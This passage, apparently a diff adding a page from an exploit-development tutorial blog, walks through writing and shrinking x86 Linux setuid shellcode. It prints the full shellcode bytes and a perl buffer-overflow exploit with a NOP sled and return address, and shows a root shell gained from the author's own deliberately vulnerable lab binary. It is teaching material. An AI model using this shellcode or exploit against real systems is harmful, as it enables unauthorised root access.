+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$</pre>
+                                    <p>You could still get a shell from the vulnerable program by excluding the setuid() and setgid() calls from the Shellcode. </p>
+
+                                    <h2> Step 5: Extract Opcodes </h2>
+                                    <p>There is a great one-line script proposed by invictus85 on <a href="https://reverseengineering.stackexchange.com/questions/15925/how-can-i-export-only-the-opcodes-from-objdump-or-any-other-program">https://reverseengineering.stackexchange.com/questions/15925/how-can-i-export-only-the-opcodes-from-objdump-or-any-other-program</a> to extract opcodes quickly from objdump. Our Shellcode will be ready for use immediately.
+                                    <pre>objdump -d ./your_program|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'</pre>
+                                    <pre>
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ objdump -d ./a1.out|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+<b>"\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x2e\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80"</b>
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$</pre>
+</p>
+                                    <p>Let's use our Shellcode to exploit the same program as in the last post. You can find details of the exploit development process at <a href="https://bluehood.github.io/exploitdev/2-3-entry.html">https://bluehood.github.io/exploitdev/2-3-entry.html</a> and <a href="https://bluehood.github.io/exploitdev/2-4-entry.html">https://bluehood.github.io/exploitdev/2-4-entry.html</a>. We firstly set the setuid bit on the program and then modify our exploit to include our Shellcode and correct the offsets. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ cp ~/Documents/exploitdev/chapter2/stack/simple_overflow ./simple_overflow
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chown root:root ./simple_overflow 
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chmod +s ./simple_overflow 
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ </pre>
+<pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ python3
+Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
+[GCC 8.4.0] on linux
+Type &#x22;help&#x22;, &#x22;copyright&#x22;, &#x22;credits&#x22; or &#x22;license&#x22; for more information.
+&#x3E;&#x3E;&#x3E; shellcode=&#x22;\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x2e\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80&#x22;
+&#x3E;&#x3E;&#x3E; print(len(shellcode))
+34
+&#x3E;&#x3E;&#x3E; </pre>
+                                    <pre>(exploit) 
+$(perl -e 'print "\x90"x138 . "\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x2e\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80" . “A”x4 "\x30\xfc\xff\xbf"x10')</pre>
+                                    
+                                    <p>The shellcode is 34 bytes in length. We adjust the NOP Sled and A characters accordingly. Launching the exploit gives us a root shell!</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ env -i $(pwd)/simple_overflow $(perl -e 'print "\x90"x138 . "\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x2e\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80" . "A"x4 . "\x30\xfc\xff\xbf"x10')
+Hello ������������������������������������������������������������������������������������������������������������������������������������������jX1�̀�.̀�
+ Sh//shh/bin��1�RS��̀AAAA0���0���0���0���0���0���0���0���0���0���
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare),1000(debug)
+# </pre>
+<br>
+                                    <h2> A Note about Length </h2>
+                                    <p>When writing Shellcode it is of primary importance that the length of the Shellcode is kept as short as possible. This makes the Shellcode as portable as possible and maximises the number of programs we can exploit since we will be able to fit the Shellcode into smaller buffers. Whilst we included the setgid() syscall in out Shellcode it is not necessary to include this syscall to obtain a root shell. Indeed we can remove this syscall from the Shellcode and the exploit will still work. </p>
+                                    <pre>(shellcode)
+\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80
+</pre>
+                                    <p>Notice there are only two syscalls now (only two int 0x80 or \xcd\x80 commands). Let's modify the offsets in our exploit and try this Shellcode of length 30. </p>
+                                    <pre>(exploit)
+$(perl -e 'print "\x90"x138 . "\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80" . "A"x8 . "\x30\xfc\xff\xbf"x10')</pre>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ env -i $(pwd)/simple_overflow $(perl -e 'print "\x90"x138 . "\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80" . "A"x8 . "\x30\xfc\xff\xbf"x10')
+Hello ������������������������������������������������������������������������������������������������������������������������������������������jX1�̀�
+ Sh//shh/bin��1�RS��̀AAAAAAAA0���0���0���0���0���0���0���0���0���0���
+# id
+uid=0(root) gid=1000(debug) groups=1000(debug),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare)
+#</pre>
+                                    <p>The exploit still works and we have shaved off a further 4 bytes. Notice that the gid of the shell has not changed to root. This is because we did not run the setgid() syscall to change to gid of the process. </p>
+                                    <p>Those who are interested should not that this setuid Shellcode can be reduced further to 27 bytes for Linux x86. Can you do it?</p>
+
+                                    <h3>References:</h3><p>
+                                    The Shellcoder's Handbook, Discovering and Exploiting Security Holes<br>
+                                    Hacking, The Art of Exploitation, Jon Erikson <br>
+                                    </p>
+
+
+                                    
+                                    <!--<img src="images/left-image.jpg" alt="" class="alignleft"> -->
+                                    
+                                    <!-- <div class="related-post-block">
+                                        
+                                        <div class="row">
+                                            <div class="col-lg-12 col-sm-12 col-md-12 col-sm-12">
+                                                <h3 class="related-post-title">Recommended Posts</h3>
+                                            </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
+                                                <div class="related-post">
+                                                    
+                                                    <div class="related-img">
+                                                        <a href="#" class="imghover"><img src="images/related-post-2.jpg" alt="" class="img-responsive"></a>
+                                                    </div>
+                                                    <div class="related-post-content">
+                                                        <h4 class="related-title"><a href="#" class="title">Drinking water dilutes 
+stomach acid</a></h4>
+                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"diet tips"</a> </span></div>
+                                                    </div>
+                                                </div>
+                                               
+                                            </div>
+                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
+                                                <div class="related-post">
+                                                    
+                                                    <div class="related-img">
+                                                        <a href="#" class="imghover"><img src="images/related-post-1.jpg" alt="" class="img-responsive"></a>
+                                                    </div>
+                                                    <div class="related-post-content">
+                                                        <h4 class="related-title"><a href="#" class="title">Top 5 natural therapies
+to fight hpylori</a></h4>
+                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"health care</a> </span></div>
+                                                    </div>
+                                                </div>
+                                                
+                                            </div>
+                                        </div>
+                                    </div> -->
+                                    <!-- /.related post block -->
+                                    <div class="post-navigation">
+                                        <!-- post navigation -->
+                                        <div class="row">
+                                            <div class="nav-links">
+                                                <div class="col-md-6 col-sm-6">
+                                                    <div class="nav-previous">
+                                                        <!-- nav previous -->
+                                                        <a href="#" class="prev-link">previous post</a>
+                                                        <div class="previous-next-title">
+                                                            <h5><a href="#" class="title"></a></h5>
+                                                        </div>
+                                                    </div>
+                                                    <!-- /. nav previous -->
+                                                </div>
+                                                <div class="col-md-6 col-sm-6">
+                                                    <div class="nav-next text-right">
+                                                        <!-- nav next -->
+                                                        <a href="#" class="next-link">next post</a>
+                                                        <div class="previous-next-title">
+                                                            <h5><a href="#" class="title"></a></h5>
+                                                        </div>
+                                                    </div>
+                                                    <!-- /.nav previous -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!-- /. post navigation -->
+
+
+                                    
+                                    
+                                </div>
+                                <!-- /.post content -->
+                            </div>
+                            <!-- /.post holder -->
+                        </div>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+    <!-- footer start -->
+    <div class="footer">
+        <div class="container">
+            <div class="row">
+                <!-- footer-about-start -->
+                
+                <!-- footer-useful links-start -->
+                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
+                    <div class="footer-widget">
+                        <h3 class="footer-title">Quick Links</h3>
+                        <ul class="angle angle-right">
+                            <li><a href="#">Home </a></li>
+                            <li><a href="#">Penetration Testing </a></li>
+                            <li><a href="#">Exploit Development</a></li>
+                            <li><a href="#">Malware</a></li>
+                            <li> <a href="#">Shellcode</a></li>
+                            <li> <a href="#">All Topics</a></li>
+                        </ul>
+                    </div>
+                </div>
+
+                 
+                <img src="../images/logo3.png" alt="" class="alignright"></a>
+                      
+                <!-- footer-useful links-close -->
+                <!-- footer-form-start -->
+                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
+    
+                </div>
+                <!-- footer-tiny-text-start -->
+                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+                    <div class="tiny-footer">
+                        <p>© 2020 - BlueHood. All Rights Reserved.</p>
+                        <p> See https://easetemplate.com for the Website Template and Other Templates </p>
+                    </div>
+                </div>
+                <!-- footer-tiny-text-start -->
+                <!-- footer-form-close -->
+            </div>
+        </div>
+    </div>
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="../js/jquery.min.js" type="text/javascript"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="../js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="../js/navigation.js" type="text/javascript"></script>
+    <script src="../js/menumaker.js" type="text/javascript"></script>
+    <script type="text/javascript" src="../js/jquery.sticky.js"></script>
+    <script type="text/javascript" src="../js/sticky-header.js"></script>
+</body>
+
+</html>
